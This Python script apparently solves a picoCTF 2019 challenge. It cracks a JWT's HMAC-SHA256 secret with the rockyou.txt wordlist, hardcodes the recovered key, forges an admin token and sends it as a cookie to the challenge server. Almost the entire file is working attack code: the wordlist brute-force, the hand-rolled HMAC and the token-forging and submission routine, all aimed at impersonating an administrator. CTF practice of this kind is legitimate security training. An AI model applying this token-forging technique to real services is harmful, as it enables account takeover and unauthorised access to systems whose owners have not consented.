#!/usr/bin/env python
import base64
import hashlib
import json
import requests
import sys
from urllib.parse import urljoin


VERBOSE = 2

def trace(*args, **kwargs):
    if VERBOSE > 1: print(*args, file=sys.stderr, flush=True, **kwargs)


def solve(url='http://2019shell1.picoctf.com:32267'):
    if 0:
        r = requests.post(url, data=dict(user='guest'))
        jwt = req.cookies['jwt']
        trace(jwt)
        key = brute_jwt(jwt)
        trace(key)

    key = 'ilovepico'
    msg = dict(user='admin')

    jwt = encode_jwt(msg, key)
    trace(jwt)

    cookies = dict(jwt=jwt)
    r = requests.post(url, data=dict(user='admin'), cookies=cookies)
    trace(r, r.url)
    trace(r.text)


trans_5C = bytes((x ^ 0x5C) for x in range(256))
trans_36 = bytes((x ^ 0x36) for x in range(256))

def hmac256(key, msg):
    dm = hashlib.sha256
    so = dm()
    si = dm()
    blocksize = so.block_size
    if len(key) > blocksize:
        key = dm(key).digest()
    key = key.ljust(blocksize, b'\0')
    so.update(key.translate(trans_5C))
    si.update(key.translate(trans_36))
    si.update(msg)
    so.update(si.digest())
    return so.digest()


def encode_jwt(body, key):
    header = {"typ": "JWT","alg": "HS256"}
    header = b64enc(json.dumps(header))
    body = b64enc(json.dumps(body))
    msg = header + b'.' + body
    sig = hmac256(key.encode('utf-8'), msg)
    jwt = msg + b'.' + b64enc(sig)
    return jwt.decode('ascii')


def decode_jwt(jwt):
    msg, sig = jwt.rsplit('.', 1)
    header, body = msg.split('.')
    msg = msg.encode('ascii')
    sig = b64dec(sig)
    body = b64dec(body)
    header = json.loads(b64dec(header))
    trace(header, body, sig)
    return header, body, msg, sig


def b64dec(s):
    s = s.strip().encode('ascii')
    return base64.urlsafe_b64decode(s + b'=' * (4 - (len(s) % 4)))


def b64enc(s):
    if isinstance(s, str):
        s = s.encode('utf-8')
    return base64.urlsafe_b64encode(s).rstrip(b'=')


def brute_jwt(jwt):
    _, _, msg, sig = decode_jwt(jwt)
    trace(msg, sig)
    with open('rockyou.txt', 'rb') as fp:
        for i, s in enumerate(fp):
            key = s.rstrip()
            if i % 100000 == 0:
                trace(i, key.decode('utf-8'))
            if hmac256(key, msg) == sig:
                return key.decode('utf-8')
        else:
            raise Exception('poop')


if __name__ == '__main__':
    print(solve(*sys.argv[1:]))
